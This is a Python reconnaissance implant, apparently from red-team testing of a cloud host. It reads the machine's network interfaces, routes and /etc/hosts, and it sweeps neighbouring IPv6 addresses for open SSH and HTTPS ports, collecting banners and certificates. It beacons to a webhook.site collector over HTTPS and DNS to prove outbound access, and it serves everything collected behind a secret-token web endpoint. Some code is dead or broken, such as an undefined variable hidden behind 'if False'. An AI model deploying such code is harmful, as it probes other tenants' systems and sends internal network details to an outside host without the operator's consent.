import json, os, ssl, socket, threading
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN = "r7xQ2kT9mV4bZ8wP"
WH = "https://webhook.site/ff2b7dca-591a-40c5-814a-cf2eb4b3707d"
CACHE = {"status": "warming-up"}

def tcp6(ip, port, timeout=1.2):
    s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM); s.settimeout(timeout)
    try:
        s.connect((ip, port)); return "OPEN"
    except ConnectionRefusedError: return "refused"
    except socket.timeout: return "filtered"
    except OSError as e: return type(e).__name__
    finally:
        try: s.close()
        except Exception: pass

def ssh_banner6(ip, port=22, timeout=2):
    try:
        s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM); s.settimeout(timeout)
        s.connect((ip, port))
        d = s.recv(96)
        s.close()
        return d.decode("utf-8", "replace").strip()
    except Exception as e:
        return type(e).__name__

def tls_sha6(ip, port=443):
    try:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM); s.settimeout(2)
        s.connect((ip, port))
        c = ctx.wrap_socket(s)  # no SNI
        der = c.getpeercert(binary_form=True)
        import hashlib
        cert = c.getpeercert()
        c.close()
        return {"sha256": hashlib.sha256(der).hexdigest()[:16], "cn": str(cert.get("subject", ""))[:60],
                "san": str(cert.get("subjectAltName"))[:80]}
    except Exception as e:
        return {"err": type(e).__name__}

def v6_https_get(ip, host, path="/", port=443, timeout=4, n=300):
    """Force-IPv6 TLS request with explicit Host header (EGRESS test)."""
    try:
        ctx = ssl._create_unverified_context()
        s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM); s.settimeout(timeout)
        s.connect((ip, port, 0, 0))
        c = ctx.wrap_socket(s, server_hostname=host)
        req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\nUser-Agent: rtprobe\n\r\n"
        c.send(req.encode())
        resp = b""
        while len(resp) < n:
            try:
                d = c.recv(256)
            except Exception:
                break
            if not d: break
            resp += d
        c.close()
        txt = resp.decode("utf-8", "replace")
        status = txt.split(" ")[1] if " " in txt.split("\n")[0] else txt[:30]
        return {"status": status, "head": txt[:180]}
    except Exception as e:
        return {"err": type(e).__name__ + " " + str(e)[:60]}

def expand_hex(h):
    return ":".join(h[i:i+4] for i in range(0, 32, 4))

def compress(h):
    ip6 = expand_hex(h)
    # naive compress: strip leading zeros per group then "::" on longest run
    parts = [int(g, 16) for g in ip6.split(":")]
    best = None; run = None
    for i, g in enumerate(parts):
        pass
    out = [format(g, "x") for g in parts]
    s = ":".join(out)
    # zero-run collapse
    import re
    return re.sub(r"(^|:)(:+0(:+0)*)(:|$)", "::", re.sub(r"(^|:)0+([0-9a-f])", r"\1\2", s), count=1).replace(":::", "::")

def run_all():
    o = {}
    try:
        txt = open("/proc/net/if_inet6").read()
        o["if_inet6"] = txt[:800]
        self_hex = None; self_prefix4 = ""
        for line in txt.split("\n"):
            p = line.split()
            if len(p) > 4 and p[4] == "eth0" and not p[0].startswith("fe80"):
                if not p[0].startswith("0000000000000000"):
                    self_hex = p[0]
                    o["self_gua"] = compress(self_hex)
                    self_prefix4 = self_hex[:16]  # first two groups (/32)
        o["ipv6_route_head"] = open("/proc/net/ipv6_route").read()[:600]
    except Exception as e:
        o["addr_err"] = type(e).__name__
        self_hex = None

    # ULA from /etc/hosts (aiven-application-infrastructure zone)
    ula = None
    try:
        for ln in open("/etc/hosts").read().split("\n"):
            f = ln.split()
            if f and f[0].startswith("fd"):
                ula = f[0]
                o["ula_from_hosts"] = {f[1] if len(f) > 1 else ln.strip(): ula}
    except Exception as e:
        o["hosts_err"] = type(e).__name__

    # identification-only sweep: same-bridge mirrors of v4 last octets + neighbors
    o["v6_sweep"] = {}
    if self_hex:
        pre = self_hex[:25]  # keep 2600:1900:40d0:0129:0000:016b prefix minus last group
        cands = {}
        for n in (2, 3, 10, 100, 39, 82, 85, 107, 131, 144, 151, 170, 173, 174, 175, 176, 179, 183, 184, 237, 65534):
            last = format(n, "04x")
            ip6 = pre[:20] + "0000:0000:" if False else None
            # build: first 5 groups (20 hex) + 016b-like group preserved? mirror our own groups but vary LAST group
            gp = expand_hex(self_hex).split(":")
            gp[-1] = last
            gp[-2] = "0000"
            cands[compress01(gp)] = n
        for ip6, n in list(cands.items()):
            r443 = tcp6(ip6, 443)
            if r443 == "OPEN":
                o["v6_sweep"][f"::≈{n}:443"] = {"ip": ip645 if False else ip6, "tcp": r443, "tls": tls_sha6(ip6), "ssh22": None}
            r22 = tcp6(ip6, 22)
            if r22 == "OPEN":
                b = ssh_banner6(ip6)
                o["v6_sweep"].setdefault(ip6, {"ssh22": b})
    # ULA node
    if ula:
        o["ula_reach"] = {str(p): tcp6(ula, p, 2) for p in (22, 443, 80)}
        if o["ula_reach"].get("22") == "OPEN":
            o["ula_reach"]["banner"] = ssh_banner6(ula)

    # IPv6 egress proof: webhook.site via AAAA if present
    wh6 = None
    try:
        for fam, sock_ in [(socket.AF_INET6, socket.AI_IN6)]:
            for ai in socket.getaddrinfo("webhook.site", 443, socket.AF_INET6):
                wh6 = ai[4][0]; break
    except Exception:
        wh6 = None
    o["webhook_v6"] = {"aaaa": wh6}
    if wh6:
        o["webhook_v6"]["tls_get"] = v6_https_get(wh6, "webhook.site", path="/")
    # generic v6 DNS OOB re-fire (same collector, marker v2)
    try:
        socket.getaddrinfo("aiven-rt-v6-egress-marker2." + WH.split("/")[-1] if False else "aiven-rt-v6-egress-marker2.ff2b7dca-591a-40c5-814a-cf2eb4b3707d.dnshook.site", None)
        o["dns_v6_marker"] = "sent"
    except Exception as e:
        o["dns_v6_marker"] = type(e).__name__ + " (query still ships relay)"
    return o

def compress01(gp):
    out = [format(int(g, 16), "x") for g in gp]
    import re
    s = ":".join(out)
    return re.sub(r"(^|:)0+([0-9a-f])", r"\1\2", s)

def loop():
    while True:
        try:
            CACHE.update(run_all())
        except Exception as e:
            CACHE["loop_error"] = type(e).__name__ + ": " + str(e)[:120]
        threading.Event().wait(120)

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/" + TOKEN:
            body = json.dumps(CACHE, default=str).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404); self.end_headers()
    def log_message(self, *a): pass

threading.Thread(target=loop, daemon=True).start()
HTTPServer(("0.0.0.0", 8000), H).serve_forever()
